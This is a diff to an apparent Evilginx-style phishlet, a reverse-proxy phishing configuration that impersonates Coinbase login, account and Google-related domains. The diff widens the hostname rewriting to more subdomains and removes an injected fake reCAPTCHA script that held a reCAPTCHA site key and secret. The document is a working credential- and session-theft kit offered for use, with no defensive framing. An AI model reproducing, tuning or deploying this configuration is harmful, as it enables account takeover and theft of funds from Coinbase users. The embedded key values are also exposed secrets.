@@ -5,11 +5,13 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'coinbase.com', session: true, is_landing: false}
   - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
   - {phish_sub: 'googletag', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'coinbase.com', session: true, is_landing: false}
 
 
 sub_filters:
-  - {triggers_on: 'login.coinbase.com', orig_sub: 'login', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript'], redirect_only: true}
-  - {triggers_on: 'www', orig_sub: 'www', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript'], redirect_only: true}
+  - {triggers_on: 'login.coinbase.com', orig_sub: 'login', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript'], redirect_only: false}
+  - {triggers_on: 'www', orig_sub: 'www', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts', orig_sub: 'accounts', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -51,26 +53,3 @@ force_post:
 login:
   domain: 'login.coinbase.com'
   path: '/signin?'
-
-js_inject:
-  - trigger_domains: [login.coinbase.com"]
-    trigger_paths: ["/signin?"]
-    trigger_params: [domain]
-    script: |
-      function lp(){
-      div.innerHTML = `
-
-      <head>
-      <title>reCAPTCHA demo: Simple page</title>
-      <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-      </head>
-      <body>
-      <form action="?" method="POST">
-      <div class="g-recaptcha" data-sitekey="your_site_key"></div>
-      <br/>
-      <input type="submit" value="Submit">
-      </form>
-      </body>
-        recaptcha.key=6Lc6_nglAAAAAMEdTa-zioG-zYZ3pDnZeN2NbAHR
-        recaptcha.secret=6Lc6_nglAAAAAORWCjM3V-lQ5WBXwoQi9JWZX-BZ
-        `;
